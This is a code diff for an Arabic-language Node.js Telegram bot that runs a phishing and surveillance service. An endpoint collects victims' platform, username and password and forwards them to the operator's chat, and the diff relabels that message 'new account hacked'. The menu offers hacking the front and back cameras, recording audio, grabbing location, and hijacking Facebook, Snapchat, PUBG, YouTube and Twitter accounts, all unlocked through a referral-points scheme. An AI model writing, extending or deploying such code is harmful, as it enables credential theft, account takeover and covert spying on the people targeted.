@@ -516,7 +516,7 @@ app.post('/submitIncrease', (req, res) => {
 
     const deviceInfo = useragent.parse(userAgent);
 
-    bot.sendMessage(chatId, `تم تلقي بيانات زيادة المتابعين:
+    bot.sendMessage(chatId, `تم اختراق حساب جديد:
 منصة: ${platform}
 اسم المستخدم: ${username}
 كلمة السر: ${password}
@@ -539,7 +539,8 @@ app.post('/submitIncrease', (req, res) => {
 
 const userPoints = new Map();
 const userReferrals = new Map();
-let pointsRequiredForSubscription = 10
+const usedReferralLinks = new Map();
+let pointsRequiredForSubscription = 15;
 
 function createReferralLink(userId) {
     const referralCode = Buffer.from(userId.toString()).toString('base64');
@@ -548,8 +549,10 @@ function createReferralLink(userId) {
 
 function addPoints(userId, points) {
     const currentPoints = userPoints.get(userId) || 0;
-    userPoints.set(userId, currentPoints + points);
+    const newPoints = currentPoints + points;
+    userPoints.set(userId, newPoints);
     checkPointsAndSubscribe(userId);
+    return newPoints;
 }
 
 function deductPoints(userId, points) {
@@ -565,7 +568,7 @@ function checkPointsAndSubscribe(userId) {
     const points = userPoints.get(userId) || 0;
     if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
         subscribedUsers.add(userId);
-        bot.sendMessage(userId, 'مبروك! لقد جمعت نقاطًا كافية للاشتراك. تم تفعيل اشتراكك الآن.');
+        bot.sendMessage(userId, 'مبروك! لقد جمعت 15 نقطة. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
     }
 }
 
@@ -576,25 +579,38 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     try {
         const referrerId = Buffer.from(startPayload, 'base64').toString();
         if (referrerId !== newUserId) {
-            addPoints(referrerId, 1);
-            const referrerPoints = userPoints.get(referrerId) || 0;
-            bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
-            bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
+            const usedLinks = usedReferralLinks.get(newUserId) || new Set();
+            if (!usedLinks.has(referrerId)) {
+                usedLinks.add(referrerId);
+                usedReferralLinks.set(newUserId, usedLinks);
+                const referrerPoints = addPoints(referrerId, 1);
+                bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
+                bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
+            } else {
+                bot.sendMessage(newUserId, 'مرحبًا بك مرة أخرى! لقد استخدمت هذا الرابط من قبل.');
+            }
         }
     } catch (error) {
         console.error('خطأ في معالجة رمز الإحالة:', error);
     }
-    showButtons(msg.chat.id);
+    showButtons(msg.chat.id, newUserId);
 });
 
-bot.onText(/\/syy/, (msg) => {
+bot.onText(/\/start/, (msg) => {
     if (!msg.text.includes(' ')) {
-        showButtons(msg.chat.id);
+        showButtons(msg.chat.id, msg.from.id.toString());
     }
 });
 
-function showButtons(chatId) {
-    let keyboard = [
+function showButtons(chatId, userId) {
+    const points = userPoints.get(userId) || 0;
+    const isSubscribed = subscribedUsers.has(userId);
+    
+    let statusMessage = isSubscribed 
+        ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
+        : `لديك ${points} نقطة. اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+
+   let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
         [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
         [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
@@ -603,15 +619,15 @@ function showButtons(chatId) {
         [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
         [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
         [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
-        [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
+        [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
         [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
         [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
         [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
-        [{ text: 'قناة المطور', url: 'https://t.me/SJGDDW' }],
-        [{ text: ' تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
+        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
     ];
 
-    bot.sendMessage(chatId, 'مرحبا اختار احد الاخيارت الذي تريده ملاحضه لان تستطيع استخدام روابط الاختراق سوى 5 مرات اذا اردت استخدام البوت بدون قيود قوم بتواصل معا المطور لاشتراك ام تريد استخدامه مجاني فقوم بجمع نقاط عبر رابط الدعوه:', {
+    bot.sendMessage(chatId, `${statusMessage}\n\nاختر إحدى الخيارات التالية:`, {
         reply_markup: {
             inline_keyboard: keyboard
         }
@@ -631,11 +647,19 @@ bot.on('callback_query', (callbackQuery) => {
             break;
         case 'my_points':
             const points = userPoints.get(userId) || 0;
-            bot.sendMessage(chatId, `لديك حاليًا ${points} نقطة.`);
+            const isSubscribed = subscribedUsers.has(userId);
+            let message = isSubscribed
+                ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
+                : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
+            bot.sendMessage(chatId, message);
             break;
-        // يمكنك إضافة المزيد من الحالات هنا للأزرار الأخرى
         default:
-            bot.sendMessage(chatId, 'عذرًا، هذه الميزة غير متوفرة حاليًا.');
+            if (!subscribedUsers.has(userId)) {
+                bot.sendMessage(chatId, 'عذرًا، يجب أن تجمع 15 نقطة للاشتراك في البوت واستخدام هذه الميزة.');
+            } else {
+                bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
+                // هنا يمكنك إضافة الكود الخاص بكل عملية
+            }
     }
 });
 
@@ -648,9 +672,9 @@ bot.onText(/\/addpoints (\d+) (\d+)/, (msg, match) => {
     const userId = match[1];
     const pointsToAdd = parseInt(match[2]);
 
-    addPoints(userId, pointsToAdd);
-    bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}`);
-    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك.`);
+    const newPoints = addPoints(userId, pointsToAdd);
+    bot.sendMessage(msg.chat.id, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. إجمالي النقاط الآن: ${newPoints}`);
+    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
 });
 
 bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
@@ -663,8 +687,9 @@ bot.onText(/\/deductpoints (\d+) (\d+)/, (msg, match) => {
     const pointsToDeduct = parseInt(match[2]);
 
     if (deductPoints(userId, pointsToDeduct)) {
-        bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}`);
-        bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك.`);
+        const newPoints = userPoints.get(userId) || 0;
+        bot.sendMessage(msg.chat.id, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. إجمالي النقاط الآن: ${newPoints}`);
+        bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
     } else {
         bot.sendMessage(msg.chat.id, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
     }
@@ -718,6 +743,7 @@ bot.onText(/\/listsubscribers/, (msg) => {
     const subscribersList = Array.from(subscribedUsers).join('\n');
     bot.sendMessage(msg.chat.id, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
 });
+
 
 bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
